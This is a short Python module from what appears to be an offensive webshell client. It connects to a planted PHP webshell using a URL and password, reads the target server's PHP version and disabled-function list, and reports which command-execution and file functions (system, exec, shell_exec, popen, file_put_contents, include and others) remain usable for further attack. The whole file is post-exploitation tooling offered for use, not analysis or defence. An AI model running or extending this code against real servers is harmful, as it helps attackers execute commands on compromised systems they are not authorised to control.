from ways.Ways import webshell
class INFO:
    url = ''
    pwd = ''
    def __init__(self,url,pwd,cmd,way):
        self.url = url
        self.pwd = pwd
        self.cmd = cmd
        self.way = way
    def Printinfo(self):
        getshell = webshell(self.url, self.pwd,self.cmd,self.way)
        func = getshell.getusefunc()
        if(func!=''):
            print("\nserver-information:\n")
            if (getshell.getversion() != None and getshell.get_disable_function() != None):
                print(
                    getshell.getversion().replace("&lt;", "<").replace("&gt;", ">").replace("&#039;", "\'").replace("&#34;",
                                                                                                                    "\"") + "\n")
        print("disable_functions:\n")
        print("\033[0;31m" + getshell.get_disable_function().replace("&lt;", "<").replace("&gt;", ">").replace(
                "&#039;", "\'").replace("&#34;", "\""))
        test_func = ["system", "passthru", "popen", "exec", "shell_exec", "file_get_contents",
                            "file_put_contents", "File", "fopen", "fread", "fgets","highlight_file","include","error_log","mail"]
        for func in test_func:
            if (func not in getshell.get_disable_function().split(',')):
                print("\033[0;36myou can use ""\033[0;31m" + func + "\033[0;36m to do something")



